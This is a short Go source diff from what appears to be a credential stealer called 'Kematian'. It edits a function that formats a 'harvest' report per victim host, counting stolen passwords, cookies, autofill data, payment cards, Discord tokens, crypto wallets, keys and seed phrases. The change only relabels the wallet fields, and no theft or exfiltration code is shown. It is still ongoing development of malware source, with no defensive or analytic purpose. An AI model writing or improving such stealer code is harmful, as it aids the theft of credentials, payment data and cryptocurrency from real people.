@@ -77,7 +77,7 @@ func formatSummary(host, osName, arch string, pw, ck, af, hi, bk, cc, dt, ex, wl
 	return "Kematian harvest — " + host + " (" + osName + "/" + arch + ")\n" +
 		"passwords: " + itoa(pw) + " | cookies: " + itoa(ck) + " | autofill: " + itoa(af) + "\n" +
 		"history: " + itoa(hi) + " | bookmarks: " + itoa(bk) + " | cards: " + itoa(cc) + "\n" +
-		"discord: " + itoa(dt) + " | extensions: " + itoa(ex) + " | wallets: " + itoa(wl) + "\n" +
+		"discord: " + itoa(dt) + " | wallet extensions: " + itoa(ex) + " | desktop wallets: " + itoa(wl) + "\n" +
 		"keys: " + itoa(keys) + " | seeds: " + itoa(seeds)
 }
 
